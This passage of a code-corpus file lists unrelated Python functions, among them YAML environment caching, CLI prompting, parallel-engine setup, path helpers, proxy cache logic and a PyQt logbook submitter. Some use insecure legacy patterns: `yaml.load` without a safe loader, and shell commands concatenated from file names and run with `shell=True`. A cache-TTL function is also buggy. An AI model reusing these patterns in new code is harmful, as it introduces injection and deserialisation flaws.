            "def load(self):\n        '''Load the environment cache from disk.'''\n\n        if not os.path.exists(self.path):\n            return\n\n        with open(self.path, 'r') as f:\n            env_data = yaml.load(f.read())\n\n        if env_data:\n            for env in env_data:\n                self.add(VirtualEnvironment(env['root']))"
        ],
        [
            "def save(self):\n        '''Save the environment cache to disk.'''\n\n        env_data = [dict(name=env.name, root=env.path) for env in self]\n        encode = yaml.safe_dump(env_data, default_flow_style=False)\n\n        with open(self.path, 'w') as f:\n            f.write(encode)"
        ],
        [
            "def prompt(text, default=None, hide_input=False,\n           confirmation_prompt=False, type=None,\n           value_proc=None, prompt_suffix=': ',\n           show_default=True, err=False):\n    \"\"\"Prompts a user for input.  This is a convenience function that can\n    be used to prompt a user for input later.\n\n    If the user aborts the input by sending a interrupt signal, this\n    function will catch it and raise a :exc:`Abort` exception.\n\n    .. versionadded:: 6.0\n       Added unicode support for cmd.exe on Windows.\n\n    .. versionadded:: 4.0\n       Added the `err` parameter.\n\n    :param text: the text to show for the prompt.\n    :param default: the default value to use if no input happens.  If this\n                    is not given it will prompt until it's aborted.\n    :param hide_input: if this is set to true then the input value will\n                       be hidden.\n    :param confirmation_prompt: asks for confirmation for the value.\n    :param type: the type to use to check the value against.\n    :param value_proc: if this parameter is provided it's a function that\n                       is invoked instead of the type conversion to\n                       convert a value.\n    :param prompt_suffix: a suffix that should be added to the prompt.\n    :param show_default: shows or hides the default value in the prompt.\n    :param err: if set to true the file defaults to ``stderr`` instead of\n                ``stdout``, the same as with echo.\n    \"\"\"\n    result = None\n\n    def prompt_func(text):\n        f = hide_input and hidden_prompt_func or visible_prompt_func\n        try:\n            # Write the prompt separately so that we get nice\n            # coloring through colorama on Windows\n            echo(text, nl=False, err=err)\n            return f('')\n        except (KeyboardInterrupt, EOFError):\n            # getpass doesn't print a newline if the user aborts input with ^C.\n            # Allegedly this behavior is inherited from getpass(3).\n            # A doc bug has been filed at https://bugs.python.org/issue24711\n            if hide_input:\n                echo(None, err=err)\n            raise Abort()\n\n    if value_proc is None:\n        value_proc = convert_type(type, default)\n\n    prompt = _build_prompt(text, prompt_suffix, show_default, default)\n\n    while 1:\n        while 1:\n            value = prompt_func(prompt)\n            if value:\n                break\n            # If a default is set and used, then the confirmation\n            # prompt is always skipped because that's the only thing\n            # that really makes sense.\n            elif default is not None:\n                return default\n        try:\n            result = value_proc(value)\n        except UsageError as e:\n            echo('Error: %s' % e.message, err=err)\n            continue\n        if not confirmation_prompt:\n            return result\n        while 1:\n            value2 = prompt_func('Repeat for confirmation: ')\n            if value2:\n                break\n        if value == value2:\n            return result\n        echo('Error: the two entered values do not match', err=err)"
        ],
        [
            "def echo_via_pager(text, color=None):\n    \"\"\"This function takes a text and shows it via an environment specific\n    pager on stdout.\n\n    .. versionchanged:: 3.0\n       Added the `color` flag.\n\n    :param text: the text to page.\n    :param color: controls if the pager supports ANSI colors or not.  The\n                  default is autodetection.\n    \"\"\"\n    color = resolve_color_default(color)\n    if not isinstance(text, string_types):\n        text = text_type(text)\n    from ._termui_impl import pager\n    return pager(text + '\\n', color)"
        ],
        [
            "def setup_engines(client=None):\n    \"\"\"Prepare all iPython engines for distributed object processing.\n\n    Args:\n      client (ipyparallel.Client, optional): If None, will create a client\n        using the default ipyparallel profile.\n    \"\"\"\n    if not client:\n        try:\n            client = ipyparallel.Client()\n        except:\n            raise DistobClusterError(\n                u\"\"\"Could not connect to an ipyparallel cluster. Make\n                 sure a cluster is started (e.g. to use the CPUs of a\n                 single computer, can type 'ipcluster start')\"\"\")\n    eids = client.ids\n    if not eids:\n        raise DistobClusterError(\n                u'No ipyparallel compute engines are available')\n    nengines = len(eids)\n    dv = client[eids]\n    dv.use_dill()\n    with dv.sync_imports(quiet=True):\n        import distob\n    # create global ObjectEngine distob.engine on each engine\n    ars = []\n    for i in eids:\n        dv.targets = i\n        ars.append(dv.apply_async(_remote_setup_engine, i, nengines))\n    dv.wait(ars)\n    for ar in ars:\n        if not ar.successful():\n            raise ar.r\n    # create global ObjectHub distob.engine on the client host\n    if distob.engine is None:\n        distob.engine = ObjectHub(-1, client)"
        ],
        [
            "def gather(obj):\n    \"\"\"Retrieve objects that have been distributed, making them local again\"\"\"\n    if hasattr(obj, '__distob_gather__'):\n        return obj.__distob_gather__()\n    elif (isinstance(obj, collections.Sequence) and \n            not isinstance(obj, string_types)):\n        return [gather(subobj) for subobj in obj]\n    else:\n        return obj"
        ],
        [
            "def apply(f, obj, *args, **kwargs):\n    \"\"\"Apply a function in parallel to each element of the input\"\"\"\n    return vectorize(f)(obj, *args, **kwargs)"
        ],
        [
            "def register_proxy_type(cls, real_type, proxy_type):\n        \"\"\"Configure engines so that remote methods returning values of type\n        `real_type` will instead return by proxy, as type `proxy_type`\n        \"\"\"\n        if distob.engine is None:\n            cls._initial_proxy_types[real_type] = proxy_type\n        elif isinstance(distob.engine, ObjectHub):\n            distob.engine._runtime_reg_proxy_type(real_type, proxy_type)\n        else:\n            # TODO: remove next line after issue #58 in dill is fixed.\n            distob.engine._singleeng_reg_proxy_type(real_type, proxy_type)\n            pass"
        ],
        [
            "def is_git_repo(path):\n    '''Returns True if path is a git repository.'''\n\n    if path.startswith('git@') or path.startswith('https://'):\n        return True\n\n    if os.path.exists(unipath(path, '.git')):\n        return True\n\n    return False"
        ],
        [
            "def is_home_environment(path):\n    '''Returns True if path is in CPENV_HOME'''\n\n    home = unipath(os.environ.get('CPENV_HOME', '~/.cpenv'))\n    path = unipath(path)\n\n    return path.startswith(home)"
        ],
        [
            "def is_redirecting(path):\n    '''Returns True if path contains a .cpenv file'''\n\n    candidate = unipath(path, '.cpenv')\n    return os.path.exists(candidate) and os.path.isfile(candidate)"
        ],
        [
            "def redirect_to_env_paths(path):\n    '''Get environment path from redirect file'''\n\n    with open(path, 'r') as f:\n        redirected = f.read()\n\n    return shlex.split(redirected)"
        ],
        [
            "def expandpath(path):\n    '''Returns an absolute expanded path'''\n\n    return os.path.abspath(os.path.expandvars(os.path.expanduser(path)))"
        ],
        [
            "def unipath(*paths):\n    '''Like os.path.join but also expands and normalizes path parts.'''\n\n    return os.path.normpath(expandpath(os.path.join(*paths)))"
        ],
        [
            "def binpath(*paths):\n    '''Like os.path.join but acts relative to this packages bin path.'''\n\n    package_root = os.path.dirname(__file__)\n    return os.path.normpath(os.path.join(package_root, 'bin', *paths))"
        ],
        [
            "def ensure_path_exists(path, *args):\n    '''Like os.makedirs but keeps quiet if path already exists'''\n    if os.path.exists(path):\n        return\n\n    os.makedirs(path, *args)"
        ],
        [
            "def walk_dn(start_dir, depth=10):\n    '''\n    Walk down a directory tree. Same as os.walk but allows for a depth limit\n    via depth argument\n    '''\n\n    start_depth = len(os.path.split(start_dir))\n    end_depth = start_depth + depth\n\n    for root, subdirs, files in os.walk(start_dir):\n        yield root, subdirs, files\n\n        if len(os.path.split(root)) >= end_depth:\n            break"
        ],
        [
            "def walk_up(start_dir, depth=20):\n    '''\n    Walk up a directory tree\n    '''\n    root = start_dir\n\n    for i in xrange(depth):\n        contents = os.listdir(root)\n        subdirs, files = [], []\n        for f in contents:\n            if os.path.isdir(os.path.join(root, f)):\n                subdirs.append(f)\n            else:\n                files.append(f)\n\n        yield root, subdirs, files\n\n        parent = os.path.dirname(root)\n        if parent and not parent == root:\n            root = parent\n        else:\n            break"
        ],
        [
            "def preprocess_dict(d):\n    '''\n    Preprocess a dict to be used as environment variables.\n\n    :param d: dict to be processed\n    '''\n\n    out_env = {}\n    for k, v in d.items():\n\n        if not type(v) in PREPROCESSORS:\n            raise KeyError('Invalid type in dict: {}'.format(type(v)))\n\n        out_env[k] = PREPROCESSORS[type(v)](v)\n\n    return out_env"
        ],
        [
            "def _join_seq(d, k, v):\n    '''Add a sequence value to env dict'''\n\n    if k not in d:\n        d[k] = list(v)\n\n    elif isinstance(d[k], list):\n        for item in v:\n            if item not in d[k]:\n                d[k].insert(0, item)\n\n    elif isinstance(d[k], string_types):\n        v.append(d[k])\n        d[k] = v"
        ],
        [
            "def join_dicts(*dicts):\n    '''Join a bunch of dicts'''\n\n    out_dict = {}\n\n    for d in dicts:\n        for k, v in d.iteritems():\n\n            if not type(v) in JOINERS:\n                raise KeyError('Invalid type in dict: {}'.format(type(v)))\n\n            JOINERS[type(v)](out_dict, k, v)\n\n    return out_dict"
        ],
        [
            "def env_to_dict(env, pathsep=os.pathsep):\n    '''\n    Convert a dict containing environment variables into a standard dict.\n    Variables containing multiple values will be split into a list based on\n    the argument passed to pathsep.\n\n    :param env: Environment dict like os.environ.data\n    :param pathsep: Path separator used to split variables\n    '''\n\n    out_dict = {}\n\n    for k, v in env.iteritems():\n        if pathsep in v:\n            out_dict[k] = v.split(pathsep)\n        else:\n            out_dict[k] = v\n\n    return out_dict"
        ],
        [
            "def dict_to_env(d, pathsep=os.pathsep):\n    '''\n    Convert a python dict to a dict containing valid environment variable\n    values.\n\n    :param d: Dict to convert to an env dict\n    :param pathsep: Path separator used to join lists(default os.pathsep)\n    '''\n\n    out_env = {}\n\n    for k, v in d.iteritems():\n        if isinstance(v, list):\n            out_env[k] = pathsep.join(v)\n        elif isinstance(v, string_types):\n            out_env[k] = v\n        else:\n            raise TypeError('{} not a valid env var type'.format(type(v)))\n\n    return out_env"
        ],
        [
            "def expand_envvars(env):\n    '''\n    Expand all environment variables in an environment dict\n\n    :param env: Environment dict\n    '''\n\n    out_env = {}\n\n    for k, v in env.iteritems():\n        out_env[k] = Template(v).safe_substitute(env)\n\n    # Expand twice to make sure we expand everything we possibly can\n    for k, v in out_env.items():\n        out_env[k] = Template(v).safe_substitute(out_env)\n\n    return out_env"
        ],
        [
            "def get_store_env_tmp():\n    '''Returns an unused random filepath.'''\n\n    tempdir = tempfile.gettempdir()\n    temp_name = 'envstore{0:0>3d}'\n    temp_path = unipath(tempdir, temp_name.format(random.getrandbits(9)))\n    if not os.path.exists(temp_path):\n        return temp_path\n    else:\n        return get_store_env_tmp()"
        ],
        [
            "def store_env(path=None):\n    '''Encode current environment as yaml and store in path or a temporary\n    file. Return the path to the stored environment.\n    '''\n\n    path = path or get_store_env_tmp()\n\n    env_dict = yaml.safe_dump(os.environ.data, default_flow_style=False)\n\n    with open(path, 'w') as f:\n        f.write(env_dict)\n\n    return path"
        ],
        [
            "def upstream_url(self, uri):\n        \"Returns the URL to the upstream data source for the given URI based on configuration\"\n        return self.application.options.upstream + self.request.uri"
        ],
        [
            "def make_upstream_request(self):\n        \"Return request object for calling the upstream\"\n        url = self.upstream_url(self.request.uri)\n        return tornado.httpclient.HTTPRequest(url,\n            method=self.request.method,\n            headers=self.request.headers,\n            body=self.request.body if self.request.body else None)"
        ],
        [
            "def ttl(self, response):\n        \"\"\"Returns time to live in seconds. 0 means no caching.\n\n        Criteria:\n        - response code 200\n        - read-only method (GET, HEAD, OPTIONS)\n        Plus http headers:\n        - cache-control: option1, option2, ...\n          where options are:\n          private | public\n          no-cache\n          no-store\n          max-age: seconds\n          s-maxage: seconds\n          must-revalidate\n          proxy-revalidate\n        - expires: Thu, 01 Dec 1983 20:00:00 GMT\n        - pragma: no-cache (=cache-control: no-cache)\n\n        See http://www.mobify.com/blog/beginners-guide-to-http-cache-headers/\n\n        TODO: tests\n\n        \"\"\"\n        if response.code != 200: return 0\n        if not self.request.method in ['GET', 'HEAD', 'OPTIONS']: return 0\n\n        try:\n            pragma = self.request.headers['pragma']\n            if pragma == 'no-cache':\n                return 0\n        except KeyError:\n            pass\n\n        try:\n            cache_control = self.request.headers['cache-control']\n\n            # no caching options\n            for option in ['private', 'no-cache', 'no-store', 'must-revalidate', 'proxy-revalidate']:\n                if cache_control.find(option): return 0\n\n            # further parsing to get a ttl\n            options = parse_cache_control(cache_control)\n            try:\n                return int(options['s-maxage'])\n            except KeyError:\n                pass\n            try:\n                return int(options['max-age'])\n            except KeyError:\n                pass\n\n            if 's-maxage' in options:\n                max_age = options['s-maxage']\n                if max_age < ttl: ttl = max_age\n            if 'max-age' in options:\n                max_age = options['max-age']\n                if max_age < ttl: ttl = max_age\n            return ttl\n        except KeyError:\n            pass\n\n        try:\n            expires = self.request.headers['expires']\n            return time.mktime(time.strptime(expires, '%a, %d %b %Y %H:%M:%S')) - time.time()\n        except KeyError:\n            pass"
        ],
        [
            "def manifest():\n    \"\"\"Guarantee the existence of a basic MANIFEST.in.\n\n    manifest doc: http://docs.python.org/distutils/sourcedist.html#manifest\n\n    `options.paved.dist.manifest.include`: set of files (or globs) to include with the `include` directive.\n\n    `options.paved.dist.manifest.recursive_include`: set of files (or globs) to include with the `recursive-include` directive.\n\n    `options.paved.dist.manifest.prune`: set of files (or globs) to exclude with the `prune` directive.\n\n    `options.paved.dist.manifest.include_sphinx_docroot`: True -> sphinx docroot is added as `graft`\n\n    `options.paved.dist.manifest.include_sphinx_docroot`: True -> sphinx builddir is added as `prune`\n    \"\"\"\n    prune = options.paved.dist.manifest.prune\n    graft = set()\n\n\n    if options.paved.dist.manifest.include_sphinx_docroot:\n        docroot = options.get('docroot', 'docs')\n        graft.update([docroot])\n\n        if options.paved.dist.manifest.exclude_sphinx_builddir:\n            builddir = docroot + '/' + options.get(\"builddir\", \".build\")\n            prune.update([builddir])\n\n    with open(options.paved.cwd / 'MANIFEST.in', 'w') as fo:\n        for item in graft:\n            fo.write('graft %s\\n' % item)\n        for item in options.paved.dist.manifest.include:\n            fo.write('include %s\\n' % item)\n        for item in options.paved.dist.manifest.recursive_include:\n            fo.write('recursive-include %s\\n' % item)\n        for item in prune:\n            fo.write('prune %s\\n' % item)"
        ],
        [
            "def format_pathname(\n        pathname,\n        max_length):\n    \"\"\"\n    Format a pathname\n\n    :param str pathname: Pathname to format\n    :param int max_length: Maximum length of result pathname (> 3)\n    :return: Formatted pathname\n    :rtype: str\n    :raises ValueError: If *max_length* is not larger than 3\n\n    This function formats a pathname so it is not longer than *max_length*\n    characters. The resulting pathname is returned. It does so by replacing\n    characters at the start of the *pathname* with three dots, if necessary.\n    The idea is that the end of the *pathname* is the most important part\n    to be able to identify the file.\n    \"\"\"\n    if max_length <= 3:\n        raise ValueError(\"max length must be larger than 3\")\n\n    if len(pathname) > max_length:\n        pathname = \"...{}\".format(pathname[-(max_length-3):])\n\n    return pathname"
        ],
        [
            "def format_uuid(\n        uuid,\n        max_length=10):\n    \"\"\"\n    Format a UUID string\n\n    :param str uuid: UUID to format\n    :param int max_length: Maximum length of result string (> 3)\n    :return: Formatted UUID\n    :rtype: str\n    :raises ValueError: If *max_length* is not larger than 3\n\n    This function formats a UUID so it is not longer than *max_length*\n    characters. The resulting string is returned. It does so by replacing\n    characters at the end of the *uuid* with three dots, if necessary.\n    The idea is that the start of the *uuid* is the most important part\n    to be able to identify the related entity.\n\n    The default *max_length* is 10, which will result in a string\n    containing the first 7 characters of the *uuid* passed in. Most of\n    the time, such a string is still unique within a collection of UUIDs.\n    \"\"\"\n    if max_length <= 3:\n        raise ValueError(\"max length must be larger than 3\")\n\n    if len(uuid) > max_length:\n        uuid = \"{}...\".format(uuid[0:max_length-3])\n\n    return uuid"
        ],
        [
            "def paginate_update(update):\n    \"\"\"\n    attempts to get next and previous on updates\n    \"\"\"\n    from happenings.models import Update\n    time = update.pub_time\n    event = update.event\n    try:\n        next = Update.objects.filter(\n            event=event,\n            pub_time__gt=time\n        ).order_by('pub_time').only('title')[0]\n    except:\n        next = None\n    try:\n        previous = Update.objects.filter(\n            event=event,\n            pub_time__lt=time\n        ).order_by('-pub_time').only('title')[0]\n    except:\n        previous = None\n    return {'next': next, 'previous': previous, 'event': event}"
        ],
        [
            "def notify_client(\n        notifier_uri,\n        client_id,\n        status_code,\n        message=None):\n    \"\"\"\n    Notify the client of the result of handling a request\n\n    The payload contains two elements:\n\n    - client_id\n    - result\n\n    The *client_id* is the id of the client to notify. It is assumed\n    that the notifier service is able to identify the client by this id\n    and that it can pass the *result* to it.\n\n    The *result* always contains a *status_code* element. In case the\n    message passed in is not None, it will also contain a *message*\n    element.\n\n    In case the notifier service does not exist or returns an error,\n    an error message will be logged to *stderr*.\n    \"\"\"\n    payload = {\n        \"client_id\": client_id,\n        \"result\": {\n            \"response\": {\n                \"status_code\": status_code\n            }\n        }\n    }\n\n    if message is not None:\n        payload[\"result\"][\"response\"][\"message\"] = message\n\n    response = requests.post(notifier_uri, json=payload)\n\n    if response.status_code != 201:\n        sys.stderr.write(\"failed to notify client: {}\\n\".format(payload))\n        sys.stderr.flush()"
        ],
        [
            "def setting(self, name_hyphen):\n        \"\"\"\n        Retrieves the setting value whose name is indicated by name_hyphen.\n\n        Values starting with $ are assumed to reference environment variables,\n        and the value stored in environment variables is retrieved. It's an\n        error if thes corresponding environment variable it not set.\n        \"\"\"\n        if name_hyphen in self._instance_settings:\n            value = self._instance_settings[name_hyphen][1]\n        else:\n            msg = \"No setting named '%s'\" % name_hyphen\n            raise UserFeedback(msg)\n\n        if hasattr(value, 'startswith') and value.startswith(\"$\"):\n            env_var = value.lstrip(\"$\")\n            if env_var in os.environ:\n                return os.getenv(env_var)\n            else:\n                msg = \"'%s' is not defined in your environment\" % env_var\n                raise UserFeedback(msg)\n\n        elif hasattr(value, 'startswith') and value.startswith(\"\\$\"):\n            return value.replace(\"\\$\", \"$\")\n\n        else:\n            return value"
        ],
        [
            "def _update_settings(self, new_settings, enforce_helpstring=True):\n        \"\"\"\n        This method does the work of updating settings. Can be passed with\n        enforce_helpstring = False which you may want if allowing end users to\n        add arbitrary metadata via the settings system.\n\n        Preferable to use update_settings (without leading _) in code to do the\n        right thing and always have docstrings.\n        \"\"\"\n        for raw_setting_name, value in six.iteritems(new_settings):\n            setting_name = raw_setting_name.replace(\"_\", \"-\")\n\n            setting_already_exists = setting_name in self._instance_settings\n            value_is_list_len_2 = isinstance(value, list) and len(value) == 2\n            treat_as_tuple = not setting_already_exists and value_is_list_len_2\n\n            if isinstance(value, tuple) or treat_as_tuple:\n                self._instance_settings[setting_name] = value\n\n            else:\n                if setting_name not in self._instance_settings:\n                    if enforce_helpstring:\n                        msg = \"You must specify param '%s' as a tuple of (helpstring, value)\"\n                        raise InternalCashewException(msg % setting_name)\n\n                    else:\n                        # Create entry with blank helpstring.\n                        self._instance_settings[setting_name] = ('', value,)\n\n                else:\n                    # Save inherited helpstring, replace default value.\n                    orig = self._instance_settings[setting_name]\n                    self._instance_settings[setting_name] = (orig[0], value,)"
        ],
        [
            "def settings_and_attributes(self):\n        \"\"\"Return a combined dictionary of setting values and attribute values.\"\"\"\n        attrs = self.setting_values()\n        attrs.update(self.__dict__)\n        skip = [\"_instance_settings\", \"aliases\"]\n        for a in skip:\n            del attrs[a]\n        return attrs"
        ],
        [
            "def get_reference_to_class(cls, class_or_class_name):\n        \"\"\"\n        Detect if we get a class or a name, convert a name to a class.\n        \"\"\"\n        if isinstance(class_or_class_name, type):\n            return class_or_class_name\n\n        elif isinstance(class_or_class_name, string_types):\n            if \":\" in class_or_class_name:\n                mod_name, class_name = class_or_class_name.split(\":\")\n\n                if not mod_name in sys.modules:\n                    __import__(mod_name)\n\n                mod = sys.modules[mod_name]\n                return mod.__dict__[class_name]\n\n            else:\n                return cls.load_class_from_locals(class_or_class_name)\n\n        else:\n            msg = \"Unexpected Type '%s'\" % type(class_or_class_name)\n            raise InternalCashewException(msg)"
        ],
        [
            "def check_docstring(cls):\n        \"\"\"\n        Asserts that the class has a docstring, returning it if successful.\n        \"\"\"\n        docstring = inspect.getdoc(cls)\n        if not docstring:\n            breadcrumbs = \" -> \".join(t.__name__ for t in inspect.getmro(cls)[:-1][::-1])\n            msg = \"docstring required for plugin '%s' (%s, defined in %s)\"\n            args = (cls.__name__, breadcrumbs, cls.__module__)\n            raise InternalCashewException(msg % args)\n\n        max_line_length = cls._class_settings.get('max-docstring-length')\n        if max_line_length:\n            for i, line in enumerate(docstring.splitlines()):\n                if len(line) > max_line_length:\n                    msg = \"docstring line %s of %s is %s chars too long\" \n                    args = (i, cls.__name__, len(line) - max_line_length)\n                    raise Exception(msg % args)\n\n        return docstring"
        ],
        [
            "def resourcePath(self, relative_path):\n        \"\"\" Get absolute path to resource, works for dev and for PyInstaller \"\"\"\n        from os import path\n        import sys\n        \n        try:\n            # PyInstaller creates a temp folder and stores path in _MEIPASS\n            base_path = sys._MEIPASS\n        except Exception:\n            base_path = path.dirname(path.abspath(__file__))\n        return path.join(base_path, relative_path)"
        ],
        [
            "def addLogbook(self, physDef= \"LCLS\", mccDef=\"MCC\", initialInstance=False):\n        '''Add new block of logbook selection windows. Only 5 allowed.'''\n        if self.logMenuCount < 5:\n            self.logMenus.append(LogSelectMenu(self.logui.multiLogLayout, initialInstance))\n            self.logMenus[-1].addLogbooks(self.logTypeList[1], self.physics_programs, physDef)\n            self.logMenus[-1].addLogbooks(self.logTypeList[0], self.mcc_programs, mccDef)\n            self.logMenus[-1].show()\n            self.logMenuCount += 1\n            if initialInstance:\n                # Initial logbook menu can add additional menus, all others can only remove themselves.\n                QObject.connect(self.logMenus[-1].logButton, SIGNAL(\"clicked()\"), self.addLogbook)\n            else:\n                from functools import partial\n                QObject.connect(self.logMenus[-1].logButton, SIGNAL(\"clicked()\"), partial(self.removeLogbook, self.logMenus[-1]))"
        ],
        [
            "def removeLogbook(self, menu=None):\n        '''Remove logbook menu set.'''\n        if self.logMenuCount > 1 and menu is not None:\n            menu.removeMenu()\n            self.logMenus.remove(menu)\n            self.logMenuCount -= 1"
        ],
        [
            "def selectedLogs(self):\n        '''Return selected log books by type.'''\n        mcclogs = []\n        physlogs = []\n        for i in range(len(self.logMenus)):\n            logType = self.logMenus[i].selectedType()\n            log = self.logMenus[i].selectedProgram()\n            if logType == \"MCC\":\n                if log not in mcclogs:\n                    mcclogs.append(log)\n            elif logType == \"Physics\":\n                if log not in physlogs:\n                    physlogs.append(log)\n        return mcclogs, physlogs"
        ],
        [
            "def acceptedUser(self, logType):\n        '''Verify enetered user name is on accepted MCC logbook list.'''\n        from urllib2 import urlopen, URLError, HTTPError\n        import json\n        \n        isApproved = False\n        \n        userName = str(self.logui.userName.text())\n        if userName == \"\":\n            return False  # Must have a user name to submit entry\n        \n        if logType == \"MCC\":\n            networkFault = False\n            data = []\n            log_url = \"https://mccelog.slac.stanford.edu/elog/dev/mgibbs/dev_json_user_list.php/?username=\" + userName\n            try:\n                data = urlopen(log_url, None, 5).read()\n                data = json.loads(data)\n            except URLError as error:\n                print(\"URLError: \" + str(error.reason))\n                networkFault = True\n            except HTTPError as error:\n                print(\"HTTPError: \" + str(error.reason))\n                networkFault = True\n            \n            # If network fails, ask user to verify\n            if networkFault:\n                msgBox = QMessageBox()\n                msgBox.setText(\"Cannot connect to MCC Log Server!\")\n                msgBox.setInformativeText(\"Use entered User name anyway?\")\n                msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)\n                msgBox.setDefaultButton(QMessageBox.Ok)\n                if msgBox.exec_() == QMessageBox.Ok:\n                    isApproved = True\n            \n            if data != [] and (data is not None):\n                isApproved = True\n        else:\n            isApproved = True\n        return isApproved"
        ],
        [
            "def prettify(self, elem):\n        \"\"\"Parse xml elements for pretty printing\"\"\"\n        \n        from xml.etree import ElementTree\n        from re import sub\n        \n        rawString = ElementTree.tostring(elem, 'utf-8')\n        parsedString = sub(r'(?=<[^/].*>)', '\\n', rawString)  # Adds newline after each closing tag\n        \n        return parsedString[1:]"
        ],
        [
            "def prepareImages(self, fileName, logType):\n        \"\"\"Convert supplied QPixmap object to image file.\"\"\"\n        import subprocess\n        \n        if self.imageType == \"png\":\n            self.imagePixmap.save(fileName + \".png\", \"PNG\", -1)\n            if logType == \"Physics\":\n                makePostScript = \"convert \" + fileName + \".png \" + fileName + \".ps\"\n                process = subprocess.Popen(makePostScript, shell=True)\n                process.wait()\n                thumbnailPixmap = self.imagePixmap.scaled(500, 450, Qt.KeepAspectRatio)\n                thumbnailPixmap.save(fileName + \".png\", \"PNG\", -1)\n        else:\n            renameImage = \"cp \" + self.image + \" \" + fileName + \".gif\"\n            process = subprocess.Popen(renameImage, shell=True)\n            process.wait()\n            if logType == \"Physics\":\n                thumbnailPixmap = self.imagePixmap.scaled(500, 450, Qt.KeepAspectRatio)\n                thumbnailPixmap.save(fileName + \".png\", \"PNG\", -1)"
        ],
        [
            "def submitEntry(self):\n        \"\"\"Process user inputs and subit logbook entry when user clicks Submit button\"\"\"\n        \n        # logType = self.logui.logType.currentText()\n        mcclogs, physlogs = self.selectedLogs()\n        success = True\n        \n        if mcclogs != []:\n            if not self.acceptedUser(\"MCC\"):\n                QMessageBox().warning(self, \"Invalid User\", \"Please enter a valid user name!\")\n                return\n            \n            fileName = self.xmlSetup(\"MCC\", mcclogs)\n            if fileName is None:\n                return\n            \n            if not self.imagePixmap.isNull():\n                self.prepareImages(fileName, \"MCC\")\n            success = self.sendToLogbook(fileName, \"MCC\")\n        \n        if physlogs != []:\n            for i in range(len(physlogs)):\n                fileName = self.xmlSetup(\"Physics\", physlogs[i])\n                if fileName is None:\n                    return\n            \n                if not self.imagePixmap.isNull():\n                    self.prepareImages(fileName, \"Physics\")\n                success_phys = self.sendToLogbook(fileName, \"Physics\", physlogs[i])\n                success = success and success_phys\n            \n        self.done(success)"
        ],
        [
            "def sendToLogbook(self, fileName, logType, location=None):\n        '''Process log information and push to selected logbooks.'''\n        import subprocess\n        \n        success = True\n        if logType == \"MCC\":\n            fileString = \"\"\n            if not self.imagePixmap.isNull():\n                fileString = fileName + \".\" + self.imageType\n        \n            logcmd = \"xml2elog \" + fileName + \".xml \" + fileString\n            process = subprocess.Popen(logcmd, shell=True)\n            process.wait()\n            if process.returncode != 0:\n                success = False\n        else:\n            from shutil import copy\n\n            path = \"/u1/\" + location.lower() + \"/physics/logbook/data/\"  # Prod path\n            # path = \"/home/softegr/alverson/log_test/\"  # Dev path\n            try:\n                if not self.imagePixmap.isNull():\n                    copy(fileName + \".png\", path)\n                    if self.imageType == \"png\":\n                        copy(fileName + \".ps\", path)\n                    else:\n                        copy(fileName + \".\" + self.imageType, path)\n            \n                # Copy .xml file last to ensure images will be picked up by cron job\n                # print(\"Copying file \" + fileName + \" to path \" + path)\n                copy(fileName + \".xml\", path)\n            except IOError as error:\n                print(error)\n                success = False\n            \n        return success"
        ],
        [
            "def setupUI(self):\n        '''Create graphical objects for menus.'''\n        \n        labelSizePolicy = QSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)\n        labelSizePolicy.setHorizontalStretch(0)\n        labelSizePolicy.setVerticalStretch(0)\n        menuSizePolicy = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)\n        menuSizePolicy.setHorizontalStretch(0)\n        menuSizePolicy.setVerticalStretch(0)\n        \n        logTypeLayout = QHBoxLayout()\n        logTypeLayout.setSpacing(0)\n        \n        typeLabel = QLabel(\"Log Type:\")\n        typeLabel.setMinimumSize(QSize(65, 0))\n        typeLabel.setMaximumSize(QSize(65, 16777215))\n        typeLabel.setSizePolicy(labelSizePolicy)\n        logTypeLayout.addWidget(typeLabel)\n        self.logType = QComboBox(self)\n        self.logType.setMinimumSize(QSize(100, 0))\n        self.logType.setMaximumSize(QSize(150, 16777215))\n        menuSizePolicy.setHeightForWidth(self.logType.sizePolicy().hasHeightForWidth())\n        self.logType.setSizePolicy(menuSizePolicy)\n        logTypeLayout.addWidget(self.logType)\n        logTypeLayout.setStretch(1, 6)\n        \n        programLayout = QHBoxLayout()\n        programLayout.setSpacing(0)\n        \n        programLabel = QLabel(\"Program:\")\n        programLabel.setMinimumSize(QSize(60, 0))\n        programLabel.setMaximumSize(QSize(60, 16777215))\n        programLabel.setSizePolicy(labelSizePolicy)\n        programLayout.addWidget(programLabel)\n        self.programName = QComboBox(self)\n        self.programName.setMinimumSize(QSize(100, 0))\n        self.programName.setMaximumSize(QSize(150, 16777215))\n        menuSizePolicy.setHeightForWidth(self.programName.sizePolicy().hasHeightForWidth())\n        self.programName.setSizePolicy(menuSizePolicy)\n        programLayout.addWidget(self.programName)\n        programLayout.setStretch(1, 6)\n        \n        # Initial instance allows adding additional menus, all following menus can only remove themselves.\n        if self.initialInstance:\n            self.logButton = QPushButton(\"+\", self)\n            self.logButton.setToolTip(\"Add logbook\")\n        else:\n            self.logButton = QPushButton(\"-\")\n            self.logButton.setToolTip(\"Remove logbook\")\n        \n        self.logButton.setMinimumSize(QSize(16, 16))  # 24x24\n        self.logButton.setMaximumSize(QSize(16, 16))  # 24x24\n        self.logButton.setObjectName(\"roundButton\")\n        # self.logButton.setAutoFillBackground(True)\n        # region = QRegion(QRect(self.logButton.x()+15, self.logButton.y()+14, 20, 20), QRegion.Ellipse)\n        # self.logButton.setMask(region)\n        \n        self.logButton.setStyleSheet(\"QPushButton {border-radius: 8px;}\")\n        \n        self._logSelectLayout = QHBoxLayout()\n        self._logSelectLayout.setSpacing(6)\n        self._logSelectLayout.addLayout(logTypeLayout)\n        self._logSelectLayout.addLayout(programLayout)\n        self._logSelectLayout.addWidget(self.logButton)\n        self._logSelectLayout.setStretch(0, 6)\n        self._logSelectLayout.setStretch(1, 6)"
        ],
        [
            "def show(self):\n        '''Display menus and connect even signals.'''\n        self.parent.addLayout(self._logSelectLayout)\n        self.menuCount += 1\n        self._connectSlots()"
        ],
        [
